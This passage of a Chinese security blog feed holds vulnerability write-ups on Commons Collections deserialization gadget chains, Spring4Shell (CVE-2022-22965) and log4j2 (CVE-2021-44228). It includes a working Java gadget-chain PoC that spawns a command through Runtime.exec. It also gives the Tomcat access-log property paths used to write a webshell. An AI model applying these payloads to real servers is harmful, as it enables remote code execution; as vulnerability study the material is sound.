<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Gadget chain:</span></span><br><span class="line"><span class="comment">       java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">    	<span class="comment">// 由于创建hashset后，会自动给lazyMap添加一个key-value，所以要remove掉这个键值对</span></span><br><span class="line">		<span class="comment">// 以保证lazyMap.get时，map.containsKey(key) == false，从而进入transform函数</span></span><br><span class="line">        lazyMap.clear();  </span><br><span class="line">    </span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField((<span class="string">&quot;iTransformers&quot;</span>));</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;serialize.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashSet);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;serialize.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>第34行调用一次<code>clear()</code>是因为<code>hashSet.add</code>会将<code>key/value</code> <code>put</code>到LazyMap中，若不<code>clear()</code>会导致反序列化时LazyMap包含该<code>key</code>，从而进不到if语句内，无法触发<code>transform</code></p>
<img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220320230828331.png" class="" title="image-20220320230828331">

<p>这条链在jdk高版本也可以触发</p>
<img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220320232027461.png" class="" title="image-20220320232027461">

<h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><p>先贴下CC3的利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Gadget chain:</span></span><br><span class="line"><span class="comment">      ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">         AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">               AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">                  LazyMap.get()</span></span><br><span class="line"><span class="comment">                     ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()  // 上面和CC1相同</span></span><br><span class="line"><span class="comment">                        InstantlateTransformer.transform()</span></span><br><span class="line"><span class="comment">                        newinstance()</span></span><br><span class="line"><span class="comment">                        TrAXFllter#TrAXFllter()</span></span><br><span class="line"><span class="comment">                        Templateslmpl.newTransformer()</span></span><br><span class="line"><span class="comment">                        Templateslmpl.getTransletinstance()</span></span><br><span class="line"><span class="comment">                        Templateslmpl.defineTransletClasses()</span></span><br><span class="line"><span class="comment">                        newinstance()</span></span><br><span class="line"><span class="comment">                        Runtlme.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>CC3的前半截调用过程和CC1一样，区别就是CC3用<code>InstantiateTransformer</code>代替了CC1的<code>InvokerTransformer</code>，并且通过字节码的方式触发，其关键点就在<code>TemplatesImpl</code>和<code>TrAXFilter</code>类</p>
<h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/bitterz/p/15035581.html" >commons-collections利用链学习总结<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/phith0n/JavaThings" >Java安全漫谈 系列<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserial项目<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>Spring Framework RCE分析</title>
    <url>/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><strong>CVE编号</strong></p>
<p>CVE-2022-22965</p>
<p><strong>影响范围</strong></p>
<ul>
<li>JDK &gt;&#x3D; 9</li>
<li>使用Apache Tomcat 作为Servlet容器，并且使用传统的war包部署方法</li>
<li>Spring Framework 5.3.0 - 5.3.17，5.2.0 - 5.2.19，以及更早的版本，或其他包含<code>spring-webmvc</code> or <code>spring-webflux</code>依赖的应用</li>
</ul>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>拉取此漏洞的<a class="link"   href="https://github.com/vulhub/vulhub/tree/master/base/spring/spring-webmvc/5.3.17" >vulhub代码<i class="fas fa-external-link-alt"></i></a>进行复现，我本地环境是<code>jdk11+tomcat8.5.39</code></p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/springrce.gif" class="" title="springrce">

<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Java内省机制"><a href="#Java内省机制" class="headerlink" title="Java内省机制"></a>Java内省机制</h3><p>Java内省(Introspector)机制就是JDK提供的一套API来查找、设置<code>JavaBean</code>的属性，只要有 <code>getter</code>&#x2F;<code>setter</code> 方法中的其中一个，那么 Java 的内省机制就会认为存在一个属性，内省的核心类就是<code>Introspector</code>类。</p>
<p>这里我们新建一个名为<code>Person</code>的<code>JavaBean</code>，使用内省的方法来调用<code>Person</code>类所有属性以及属性的读写方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private Integer age;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Integer getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(Integer age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.BeanInfo;</span><br><span class="line"><span class="keyword">import</span> java.beans.Introspector;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BeanInfo</span> <span class="variable">info</span> <span class="operator">=</span> Introspector.getBeanInfo(Person.class);</span><br><span class="line">        PropertyDescriptor[] properties =</span><br><span class="line">                info.getPropertyDescriptors();</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor pd : properties) &#123;</span><br><span class="line">            System.out.println(pd.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;    [*]&quot;</span> + pd.getReadMethod());</span><br><span class="line">            System.out.println(<span class="string">&quot;    [*]&quot;</span> + pd.getWriteMethod());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果除了包含<code>Person</code>类的属性和属性的读写方法之外，另外还包括<code>class</code>属性以及<code>getClass</code>方法，这是因为呢？</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417095400459.png" class="" title="image-20220417095400459">

<h3 id="为什么会有class属性？"><a href="#为什么会有class属性？" class="headerlink" title="为什么会有class属性？"></a>为什么会有class属性？</h3><p>查看<code>Introspector.getBeanInfo(Class&lt;?&gt; beanClass)</code>方法，会将<code>beanClass</code>传入<code>Introspector</code>构造方法，并调用<code>Introspector</code>实例<code>getBeanInfo()</code>方法</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417101358466.png" class="" title="image-20220417102937868">

<p>先跟入<code>Introspector</code>构造方法，<code>stopClass</code>为空就会获取父类<code>java.lang.Object</code>的<code>BeanInfo</code>并赋给<code>superBeanInfo</code></p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417102956944.png" class="" title="image-20220417102956944">

<p>完成构造方法后调用<code>getBeanInfo()</code>，<code>getBeanInfo()</code>方法里面的<code>getTargetMethodInfo()</code>、<code>getTargetEventInfo()</code>、<code>getTargetPropertyInfo()</code>几个方法都会先获取<code>superBeanInfo</code>中的值并加到自己的<code>BeanInfo</code>中</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417110613974.png" class="" title="image-20220417110613974">

<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417110005105.png" class="" title="image-20220417110005105">

<p>因为<code>java.lang.Object</code>存在一个<code>getClass()</code>方法，所以内省机制会认为有<code>class</code>属性。这也就解释了为什么<code>Person</code>类有<code>class</code>属性和<code>getClass</code>方法了。</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417111434390.png" class="" title="image-20220417111434390">

<h3 id="SpirngBean"><a href="#SpirngBean" class="headerlink" title="SpirngBean"></a>SpirngBean</h3><p><code>SpringBean</code>可以当成<code>JavaBean</code>的升级版，由<code>Spring</code>框架的<code>ApplicationContext</code>操控<code>SpringBean</code>，<code>ApplicationContext</code>也称控制反转（IoC）容器，是<code>Spring</code>框架的核心。控制反转就是<strong>用户将对象转为实例过程，变成了容器生产实例，然后通过实例去注入到对应的对象的过程</strong>。</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417170034353.png" class="" title="image-20220417170034353">

<p>简单的可以将<code>Spring</code>容器理解为工厂，<code>SpringBean</code>的生产过程就是我们定义好什么产品（Bean）需要什么样的原材料（Bean中的属性）这样的配置信息，<code>Spring</code>容器负责将原材料生产（实例化）为产品并存储（Cache）</p>
<blockquote>
<p>在SpringBean要使用时，第一步就是从SpringBean的注册表中获取Bean的配置信息，然后根据配置信息实例化Bean，实例化以后的Bean被映射到了Spring容器中，并且被存储在了Bean Cache池中，当应用程序要使用Bean时，会向Bean Cache池发起调用。</p>
</blockquote>
<p>参考<code>panda</code>大佬画的一张图</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417115224077.png" class="" title="image-20220417115224077">

<h2 id="关键代码分析"><a href="#关键代码分析" class="headerlink" title="关键代码分析"></a>关键代码分析</h2><p>根据历史漏洞分析<a class="link"   href="http://rui0.cn/archives/1158?wglebi=4dr1b" >文章<i class="fas fa-external-link-alt"></i></a>，看下通到<code>CachedIntrospectionResults</code>的调用链，可以看到在<code>getPropertyAccessorForPropertyPath</code>递归了8次</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220417235759704.png" class="" title="image-20220417235759704">

<p><code>getPropertyAccessorForPropertyPath</code>方法根据分隔符<code>.</code>将传入的字符串分割，并从左往右递归处理嵌套属性（嵌套结构的理解可以<a class="link"   href="https://www.cnblogs.com/binarylei/p/10267928.html" >参考文章<i class="fas fa-external-link-alt"></i></a>），所以如果我们想通过class去调用classLoader的属性，只需要通过class.classLoader的方式即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> AbstractNestablePropertyAccessor <span class="title function_">getPropertyAccessorForPropertyPath</span><span class="params">(String propertyPath)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取嵌套属性的第一个属性</span></span><br><span class="line">        <span class="comment">// 比如对于属性: foo.bar[0].name</span></span><br><span class="line">        <span class="comment">// 首先获取到 foo 的索引位置</span></span><br><span class="line">        <span class="comment">// getFirstNestedPropertySeparatorIndex是详细的方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);</span><br><span class="line">        <span class="comment">// Handle nested properties recursively.</span></span><br><span class="line">        <span class="comment">//递归处理嵌套属性</span></span><br><span class="line">        <span class="keyword">if</span> (pos &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取所在的属性和对应的name</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">nestedProperty</span> <span class="operator">=</span> propertyPath.substring(<span class="number">0</span>, pos);</span><br><span class="line">            <span class="type">String</span> <span class="variable">nestedPath</span> <span class="operator">=</span> propertyPath.substring(pos + <span class="number">1</span>);</span><br><span class="line">            <span class="type">AbstractNestablePropertyAccessor</span> <span class="variable">nestedPa</span> <span class="operator">=</span> getNestedPropertyAccessor(nestedProperty);</span><br><span class="line">            <span class="comment">//递归调用</span></span><br><span class="line">            <span class="keyword">return</span> nestedPa.getPropertyAccessorForPropertyPath(nestedPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以通过<code>Tomcat Access Log</code>来写shell。<code>Tomcat Access Log</code>是通过 <code>server.xml</code> 配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span> <span class="attr">prefix</span>=<span class="string">&quot;access.&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.log&quot;</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t &quot;</span>%<span class="attr">r</span>&quot; %<span class="attr">s</span> %<span class="attr">b</span> &quot;%&#123;<span class="attr">Referer</span>&#125;<span class="attr">i</span>&quot; &quot;%&#123;<span class="attr">User-Agent</span>&#125;<span class="attr">i</span>&quot; %&#123;<span class="attr">X-Forwarded-For</span>&#125;<span class="attr">i</span> &quot;%<span class="attr">Dms</span>&quot;&quot; <span class="attr">resolveHosts</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据前面对<code>SpirngBean</code>和内省机制的理解，通过xml文件加载的配置属性，实际上也是可以通过内省机制修改的，Tomcat具体有哪些属性可以参考<a class="link"   href="https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html" >官方文档<i class="fas fa-external-link-alt"></i></a>，通过修改下面的几个属性可创建任意后缀名的文件，即可写入一个shell</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.directory =</span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.prefix =</span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.suffix = </span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.fileDateFormat =</span><br></pre></td></tr></table></figure>

<h2 id="为什么只有-gt-x3D-jdk9受影响？"><a href="#为什么只有-gt-x3D-jdk9受影响？" class="headerlink" title="为什么只有 &gt;&#x3D; jdk9受影响？"></a>为什么只有 &gt;&#x3D; jdk9受影响？</h2><p>此漏洞其实算是<code>CVE-2010-1622</code>的JDK高版本利用，<code>CVE-2010-1622</code>的修复增加了<code>class.classLoader</code>的黑名单限制，而<code>jdk9</code>以下版本只能通过<code>class.classLoader</code>利用，<code>pd.getName</code>为<code>classLoader</code>时，<code>beanClass</code>为<code>Class</code>，即所以没法利用，黑名单判断代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Class.class != beanClass || !<span class="string">&quot;classLoader&quot;</span>.equals(pd.getName()) &amp;&amp; !<span class="string">&quot;protectionDomain&quot;</span>.equals(pd.getName())) &#123;</span><br><span class="line">    ...... <span class="comment">// 正常逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>jdk9</code>引入了<a class="link"   href="https://blog.csdn.net/charles_neil/article/details/114460702" >模块系统<i class="fas fa-external-link-alt"></i></a>，可通过<code>class.module.classLoader</code>使得当<code>pd.getName</code>为<code>classLoader</code>时，<code>Class.class != beanClass</code>，从而不走后面<code>||</code>判断逻辑导致绕过</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220418003620510.png" class="" title="image-20220418003620510">

<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><h1 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h1><p>由于本地调试环境问题，导致调试前踩了不少坑，这里记录下</p>
<h3 id="1-CATALINA-BASE"><a href="#1-CATALINA-BASE" class="headerlink" title="1.CATALINA_BASE"></a><strong>1.CATALINA_BASE</strong></h3><p><code>tomcat</code>默认配置的<code>CATALINA_BASE</code>和<code>CATALINA_HOME</code>是同一目录，这两者的区别可参考<a class="link"   href="https://tomcat.apache.org/tomcat-8.5-doc/introduction.html#CATALINA_HOME_and_CATALINA_BASE" >官网介绍<i class="fas fa-external-link-alt"></i></a></p>
<p>用idea配置tomcat后，启动时<code>CATALINA_BASE</code>并没有和<code>CATALINA_HOME</code>在同一目录，而是在C盘的用户目录下</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409181507272.png" class="" title="image-20220409181507272">

<p>写入的<code>shell</code>在<code>CATALINA_BASE</code>下，而不是tomcat的安装目录<code>CATALINA_HOME</code>下，这就导致生成的shell访问不到</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409182426895.png" class="" title="image-20220409182426895">

<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409181759954.png" class="" title="image-20220409181759954">

<p><strong>解决办法</strong></p>
<p>idea中配置tomcat环境变量，指定<code>CATALINA_BASE</code>为本地tomcat目录，然后重启即可</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409222330606.png" class="" title="image-20220409222330606">

<h3 id="2-idea配置tomcat端口不生效"><a href="#2-idea配置tomcat端口不生效" class="headerlink" title="2.idea配置tomcat端口不生效"></a>2.idea配置tomcat端口不生效</h3><p>为了解决上一个问题，idea配置了<code>CATALINA_BASE</code>后，idea中不管怎么设置tomcat服务的<code>HTTP port</code>，运行时始终都是以tomcat默认的<code>8080</code>端口启动（一直以为是我项目配置问题，这里卡了半天也没整出来，吐了…）</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409223054122.png" class="" title="image-20220409223054122">

<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409223908669.png" class="" title="image-20220409223908669">

<p>还不清楚具体是什么原因导致的，如果要修改端口只能修改tomcat的<code>server.xml</code>配置文件，或者直接访问默认的<code>8080</code>端口</p>
<img src="/2022/04/18/Spring-Framework-RCE%E5%88%86%E6%9E%90/image-20220409224548056.png" class="" title="image-20220409224548056">

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   href="http://rui0.cn/archives/1158" >http://rui0.cn/archives/1158<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/11129#toc-13" >https://xz.aliyun.com/t/11129#toc-13<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://tttang.com/archive/1532/" >https://tttang.com/archive/1532/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement" >https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/vulhub/vulhub/tree/master/base/spring/spring-webmvc/5.3.17" >https://github.com/vulhub/vulhub/tree/master/base/spring/spring-webmvc/5.3.17<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965" >https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Honnyee/article/details/85337647" >https://blog.csdn.net/Honnyee/article/details/85337647<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://juejin.cn/post/6966158157202587662" >https://juejin.cn/post/6966158157202587662<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2 RCE分析与复现</title>
    <url>/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的😄</p>
<h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173">

<p>或者换做直接引<code>log4j</code>的包也是OK的。</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219150315768.png" class="" title="image-20220219150315768">

<p>通过JNDI注入利用<a class="link"   href="https://github.com/welk1n/JNDI-Injection-Exploit" >工具<i class="fas fa-external-link-alt"></i></a>在本地启动JNDI服务，根据项目JDK版本在<code>log.error</code>中插入对应payload即可触发</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123155520880.png" class="" title="image-20220123155520880">

<h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>跟入error方法，在<code>AbstractLogger</code>类的<code>logIfEnabled</code>方法中进行一层判断，满足了配置的log等级才输出日志</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isEnabled(level, marker, message)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logMessage(fqcn, level, marker, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟到<code>isEnabled</code>方法下面看看是怎么判断，可以看到filter方法中302行会判断传入的level是否大于配置的level，日志输出等级从低到高是<code>All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF</code>，程序会打印高于或等于所设置级别的日志，而默认配置为<code>error</code>等级，这也就是为什么默认配置下<code>error</code>和<code>fatal</code>可以触发，而<code>debug/info/warn</code>触发不了的原因。</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123163628452.png" class="" title="image-20220123163628452">

<p>我们也可以通过修改log4j2.xml配置来配置日志输出等级</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219145944559.png" class="" title="image-20220219145944559">

<p>接着从<code>logMessage</code>方法往下跟到<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法，89行跟入<code>encode</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="comment">// 跟入</span></span><br><span class="line">    <span class="built_in">this</span>.getLayout().encode(event, <span class="built_in">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>PatternLayout</code>类实现<code>encode</code>方法，接着关注<code>toText</code>方法</p>
